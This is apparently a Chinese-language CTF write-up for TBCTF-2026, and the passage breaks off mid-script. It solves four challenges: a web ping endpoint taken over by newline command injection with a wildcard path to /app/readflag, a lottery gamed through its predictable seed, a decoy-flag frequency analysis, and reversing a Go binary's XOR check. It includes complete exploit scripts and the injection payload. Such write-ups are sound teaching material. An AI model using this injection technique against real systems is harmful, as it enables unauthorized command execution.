---
title: TBCTF-2026
url: https://mp.weixin.qq.com/s/mpE6v3IkRkDRjbZiFCVj_A
source: Doonsec's feed
date: 2026-06-27
fetch_date: 2026-06-28T06:09:15.280974
---

# TBCTF-2026

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5ePq0tmIv3F4B4Fpd2GHPmOO4HcH4BXBbyChKGXNgWbcGos3FJnl1Bw6hetUBAg30Y8D9InVvMhp1pJq9cDP1oKrXwjUJ0al34/0?wx_fmt=jpeg)

# TBCTF-2026

原创

玄网安全 oPis
玄网安全 oPis

玄网安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# TBCTF-2026😶😶😶😶😶😶

---

# Ping Me(web)

## Summary

这题的核心是一个典型的命令注入。后端虽然限制了输入只能是“数字和点”，但它错误地使用了 `re.match(..., flags=re.MULTILINE)`，导致只校验了第一行；再配合 `shell=True`，我们可以通过换行注入第二条命令，并利用通配符在不出现字母的情况下执行 `/app/readflag`。

## Solution

### Step 1: 代码审计确认换行注入

源码里最关键的逻辑在 app.py：

* 输入长度必须不超过 `15`
* 不能包含字母
* 不能包含 `$`
* 正则检查是 `re.match(r"^[\d.]+$", ip, flags=re.MULTILINE)`
* 最终执行 `subprocess.check_output(command, shell=True, executable='/bin/bash')`

问题在于 `MULTILINE` 会让 `^` 和 `$` 匹配每一行的开头和结尾，而 `re.match()` 只要求从字符串开头开始匹配即可。
因此只要第一行是合法的数字，比如 `0`，后面即使再跟一个换行和新命令，也能通过校验。

也就是说，这样的输入能够绕过过滤：

```
0
<second command>
```

在 shell 中，换行本身就是命令分隔符，所以第二行会被当成新的命令执行。

### Step 2: 用纯符号路径执行 `/app/readflag`

还需要解决两个限制：

* 不能输入字母，所以不能直接写 `/app/readflag`
* 总长度不能超过 `15`

查看 Dockerfile 和 readflag.c 可以知道：

* 程序工作目录在 `/app`
* 存在一个 SUID 可执行文件 `readflag`
* `readflag` 会直接打印环境变量 `FLAG`

于是可以利用 Bash 通配符来避免字母：

```
0
/???/????????
```

解释如下：

* `/???/????????` 正好能展开成 `/app/readflag`
* 第一行 `0` 可以通过“只含数字”的校验
* 整个 payload 长度刚好是 `15`

实际提交后，服务端会执行两条命令：

```
ping -c 1 -W 2 0
/app/readflag
```

下面是一份完整利用脚本：

```
import re
import sys

import requests

URL = "https://web-ping-me.tracebash.xyz/api/ping"
PAYLOAD = "0\n/???/????????"
FLAG_RE = re.compile(r"TBCTF\{[^}]+\}")

def main():
    response = requests.post(
        URL,
        data=PAYLOAD,
        headers={"Content-Type": "text/plain"},
        timeout=10,
    )
    response.raise_for_status()

    body = response.json().get("output", "")
    match = FLAG_RE.search(body)
    if not match:
        raise RuntimeError("Flag not found in response.")

    print(f"payload: {PAYLOAD!r}")
    print(f"flag: {match.group(0)}")

if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"error: {exc}")
        sys.exit(1)
```

运行结果：

```
payload: '0\n/???/????????'
flag: TBCTF{0ld_5ch00l_c0mm4nd_1nj3c710n_0n_573r01d5}
```

## Flag

```
TBCTF{0ld_5ch00l_c0mm4nd_1nj3c710n_0n_573r01d5}
```

# Random Cheese(web)

## Summary

这题的核心不是拼运气，而是发现用户可设置的 `lucky_number` 会被后端直接当成随机数种子。由于同一个 `lucky_number` 对应的 10 次抽奖结果完全固定，我们只要离线枚举 `1..1000`，找到任意一个总分至少 `85` 的号码，就能稳定拿到 flag。

## Solution

### Step 1: 确认抽奖结果可预测

站点提供注册、登录、抽奖和设置幸运数字功能，要求 10 抽后总分达到 `85+` 才能 claim flag。

测试后可以确认：

* `POST /spin` 会直接返回本次抽中的分值
* 修改 `lucky_number` 会重置当前抽奖进度
* 对同一个 `lucky_number`，连续 10 抽的结果每次都完全一致

这说明服务端并不是真随机，而是使用 `lucky_number` 初始化伪随机数生成器。其行为可等价理解为：

```
import random

rng = random.Random(lucky_number)
score_list = [rng.randint(1, 10) for _ in range(10)]
```

本地验证后，Python 的 `random.Random(lucky_number).randint(1, 10)` 生成序列与站点返回结果一致。

### Step 2: 离线枚举 lucky number 并在线 claim

接下来只需要枚举 `1..1000` 的所有幸运数字，找出 10 次得分总和大于等于 `85` 的值即可。

例如，`lucky_number = 854` 的结果为：

```
rolls = [6, 6, 9, 9, 10, 8, 10, 9, 10, 10]
total = 87
```

把幸运数字改成 `854`，然后连续抽 10 次，最后提交 claim，就能直接得到 flag。

```
import random
import re
import sys
import uuid

import requests

BASE_URL = "https://web-random-cheese.tracebash.xyz"
FLAG_RE = re.compile(r"TBCTF\{[^}]+\}")

def find_winning_lucky_number():
    for lucky_number in range(1, 1001):
        rng = random.Random(lucky_number)
        rolls = [rng.randint(1, 10) for _ in range(10)]
        total = sum(rolls)
        if total >= 85:
            return lucky_number, rolls, total
    raise RuntimeError("No winning lucky number found.")

def exploit():
    lucky_number, rolls, total = find_winning_lucky_number()

    session = requests.Session()
    username = "u" + uuid.uuid4().hex[:8]
    password = "p" + uuid.uuid4().hex[:8]

    session.post(
        f"{BASE_URL}/register",
        data={"username": username, "password": password},
        timeout=10,
    )
    session.post(
        f"{BASE_URL}/login",
        data={"username": username, "password": password},
        timeout=10,
    )
    session.post(
        f"{BASE_URL}/update_lucky",
        data={"lucky_number": str(lucky_number)},
        timeout=10,
    )

    for _ in range(10):
        session.post(f"{BASE_URL}/spin", timeout=10)

    response = session.post(f"{BASE_URL}/claim", timeout=10)
    match = FLAG_RE.search(response.text)
    if not match:
        raise RuntimeError("Flag not found in server response.")

    print(f"winning_lucky_number: {lucky_number}")
    print(f"rolls: {rolls}")
    print(f"total: {total}")
    print(f"flag: {match.group(0)}")

if __name__ == "__main__":
    try:
        exploit()
    except Exception as exc:
        print(f"error: {exc}")
        sys.exit(1)
```

运行结果：

```
winning_lucky_number: 854
rolls: [6, 6, 9, 9, 10, 8, 10, 9, 10, 10]
total: 87
flag: TBCTF{t0m_4nd_j3rry_l0v3s_ch33s3_4nd_r4nd0mness}
```

## Flag

```
TBCTF{t0m_4nd_j3rry_l0v3s_ch33s3_4nd_r4nd0mness}
```

# Sanity Check

## Summary

附件里给了一个 `flag_pool` 目录，里面有 8001 个看起来都像真的 `TBCTF{...}`。核心思路是把所有 flag 按下划线拆词做词频统计，真 flag 通常会包含与题意强相关、且只出现一次的关键词。

## Solution

### Step 1: 统计词频并找异常值

先遍历所有 `flag_*.txt`，提取 `TBCTF{}` 内部内容，再按 `_` 分词。

这批伪造 flag 大多由固定词表随机拼接而成，而 `s4n1ty`、`v3r1f13d` 这两个词只出现了一次，和题目名 `Sanity Check` 高度相关，因此对应文件就是最可疑的真 flag。

```
import collections
import pathlib
import re
import sys

FLAG_RE = re.compile(r"^TBCTF\{([A-Za-z0-9_]+)\}$")

def load_flags(base: pathlib.Path):
    flags = []
    for path in sorted(base.glob("*.txt")):
        content = path.read_text(encoding="utf-8").strip()
        match = FLAG_RE.fullmatch(content)
        if not match:
            continue
        tokens = match.group(1).split("_")
        flags.append((path.name, content, tokens))
    return flags

def choose_real_flag(flags):
    counts = collections.Counter()
    for _, _, tokens in flags:
        counts.update(tokens)

    def score(item):
        _, _, tokens = item
        singleton_count = sum(1 for token in tokens if counts[token] == 1)
        rarity_score = sum(1 / counts[token] for token in tokens)
        return (singleton_count, rarity_score)

    return max(flags, key=score)

def main():
    if len(sys.argv) > 1:
        base = pathlib.Path(sys.argv[1])
    else:
        base = pathlib.Path(r"C:\Users\ZhuanZ（无密码）\Downloads\sanity_check\flag_pool")

    flags = load_flags(base)
    filename, flag, _ = choose_real_flag(flags)
    print(f"file: {filename}")
    print(f"flag: {flag}")

if __name__ == "__main__":
    main()
```

运行结果：

```
file: flag_3482.txt
flag: TBCTF{s4n1ty_v3r1f13d_8291}
```

### Step 2: 快速验证

直接全文检索异常词可以再次确认：

```
rg -n "s4n1ty|v3r1f13d|8291" flag_pool
```

命中结果只有一条：

```
flag_3482.txt:1: TBCTF{s4n1ty_v3r1f13d_8291}
```

## Flag

```
TBCTF{s4n1ty_v3r1f13d_8291}
```

# Something

## Summary

题目给了一个 Go 编译的 64 位静态 ELF。程序存在多条诱饵校验路径，真正的校验逻辑在 `main.reallocate_memory_region`：取 `TBCTF{...}` 中间 16 字节，反转后异或，再和加密常量比较。

## Solution

### Step 1: 识别 Go 符号和加密字符串

先查看文件类型和符号：

```
file chall
go tool nm chall | grep 'main\.'
```

可以看到关键符号：

```
main.encPrompt
main.encIncorrect
main.encCorrect
main.encExpected
main.reallocate_memory_region
```

程序里的提示、错误信息、正确提示和 expected 数据都被 XOR 加密。 解密用的固定值来自 `TBCTF{` 六个字符的异或：

```
'T' ^ 'B' ^ 'C' ^ 'T' ^ 'F' ^ '{' = 0x3c
```

字符串最终还会再异或 `0x2a`，所以整体等价于：

```
byte ^ 0x3c ^ 0x2a = byte ^ 0x16
```

### Step 2: 还原真正校验逻辑

`main.main` 先检查输入必须满足：

```
TBCTF{...}
```

中间内容长度必须是 16。前面几个分支是诱饵，例如哈希、`ssh` 前缀、特殊字节、乘积取模等，命中后会输出 fake flag。

真正校验在：

```
main.reallocate_memory_region
```

核心逻辑等价于：

```
buf = input_inner[:16]
buf = buf[::-1]
buf = [x ^ 0xd7 for x in buf]
buf = [x ^ 0x2a for x in buf]
buf == decrypt(encExpected)
```

其中：

```
0xd7 ^ 0x2a = 0xfd
decrypt(encExpected) = encExpected ^ 0x16
```

所以反推：

```
input_inner = reverse((encExpected ^ 0x16) ^ 0xfd)
            = reverse(encExpected ^ 0xeb)
```

完整 solve 脚本如下：

```
#!/usr/bin/env python3

enc_expected = bytes.fromhex(
    "ca89db998d86d886b499db93b49dd899"
)

inner = bytes([b ^ 0xEB for b in enc_expected])[::-1]
flag = b"TBCTF{" + inner + ...